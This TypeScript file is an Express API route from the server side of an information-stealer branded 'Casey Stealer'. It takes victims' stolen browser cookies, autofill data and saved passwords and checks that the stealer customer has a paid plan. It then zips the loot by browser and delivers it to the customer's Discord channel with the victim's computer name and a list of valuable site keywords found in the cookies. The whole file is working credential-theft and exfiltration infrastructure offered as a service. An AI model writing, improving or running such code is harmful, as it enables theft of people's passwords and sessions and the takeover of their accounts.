import { Request, Response } from 'express';
import { emojis } from '../../utils/emojis';
import { EmbedBuilder, ChannelType, AttachmentBuilder } from 'discord.js';
import { client } from '../../app';
import { keywords } from '../../utils/keywords';

import JSZip from 'jszip';

import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient();

export default {
    name: `/api/browsers-data`, method: 'post',

    async execute(req: Request, res: Response) {
      const { computer_name, data, stealer_user } = req.body;
      if(!data || !stealer_user) return;

      const user = await prisma.users.findFirst({
          where: {
              id: stealer_user
          }
      });
      if(!user?.plan) return;

      const first_merge = merge(data?.cookies?.map((c: any) => c?.browser?.replace('Stable', '').trim()), data.autofills.map((c: any) => c.browser.replace('Stable', '').trim()));
      const second_merge = merge(first_merge, data?.passwords?.map((c: any) => c?.browser?.replace('Stable', '').trim()));

      const browserDataZip = new JSZip();

      for(const folder of second_merge) {
        const cookies = data?.cookies?.find((d: any) => d.browser.replace('Stable', '').trim() === folder);
        const autofills = data?.autofills?.find((d: any) => d.browser.replace('Stable', '').trim() === folder);
        const passwords = data?.passwords?.find((d: any) => d.browser.replace('Stable', '').trim() === folder);

        if(cookies?.list?.length) browserDataZip.file(`${folder}/Cookies.txt`, cookies.list.join('\n\n'), { createFolders: true });
        if(autofills?.list?.length) browserDataZip.file(`${folder}/Autofills.txt`, autofills.list.join('\n\n'), { createFolders: true });
        if(passwords?.list?.length) browserDataZip.file(`${folder}/Passwords.txt`, passwords.list.join('\n\n'), { createFolders: true });
      };

      const zipFile = await browserDataZip.generateAsync({ type: 'nodebuffer'});
      const attachment = new AttachmentBuilder(Buffer.from(zipFile), { name: `BrowserData.zip` });

      const cookies_embed = new EmbedBuilder().setColor(953553)
      .setAuthor({ name: `Casey | Browser Data `, iconURL: client.user?.avatarURL()! })
      .addFields(
        {
          name: `${emojis.cookies} Cookies (${data.cookies.length}):`,
          value: `${data.cookies.map((c: any) => c.browser.replace('Stable', '').trim()).length ? data.cookies.map((c: any) => c.browser.replace('Stable', '').trim()).join(', ') : 'No Cookies Found'}.`
        },
        {
          name: `${emojis.list} Autofills (${data.autofills.length}):`,
          value: `${data.autofills.map((c: any) => c.browser.replace('Stable', '').trim()).length ? data.autofills.map((c: any) => c.browser.replace('Stable', '').trim()).join(', ') : 'No Autofills Found'}.`
        },
        {
          name: `${emojis.passwords} Passwords (${data.passwords.length}):`,
          value: `${data.passwords.map((c: any) => c.browser.replace('Stable', '').trim()).length ? data.passwords.map((c: any) => c.browser.replace('Stable', '').trim()).join(', ') : 'No Passwords Found'}.`
        }
      )
      .setFooter({ text: `Casey Stealer | ${computer_name}`, iconURL: client.user?.avatarURL()! });

      const guild = await client?.guilds?.fetch(user?.guild_id!);
      const channel = await guild?.channels?.fetch(user?.channel_id!);

      if(channel?.type !== ChannelType.GuildText) return;

      const message = await channel?.send({
          embeds: [
            cookies_embed
          ],
      });

      const thread = await message.startThread({
          name: 'More Browser Data Informations',
          autoArchiveDuration: 60,
      });

      const find_keywords = data.cookies.map((c: any) => c?.list?.join('\n')); 

      const hq_embed = new EmbedBuilder().setColor(953553)
      .setAuthor({ name: `Casey | Cookies`, iconURL: client.user?.avatarURL()! })
      .addFields(
        {
          name: `${emojis.special} Keywords [${keywords.filter((x: any) => find_keywords.join('\n').includes(x)).length}]:`,
          value: `\`\`\`${keywords.filter((x: any) => find_keywords.join('\n').includes(x)).join(', ').replaceAll('.com', '').replaceAll('.net', '').replaceAll('.tv', '') || 'No Keywords Found.'}\`\`\``
        }
      )
      .setFooter({ text: `Casey Stealer | ${computer_name}`, iconURL: client.user?.avatarURL()! });

      await thread?.send({
        embeds: [
          hq_embed
        ],
        files: [
          attachment
        ],
    });

      res.status(200);
  },
};

function merge(a: any, b: any, predicate = (a: any, b: any) => a === b) {
  const c = [...a];
  b.forEach((bItem: any) => (c.some((cItem) => predicate(bItem, cItem)) ? null : c.push(bItem)))
  return c;
};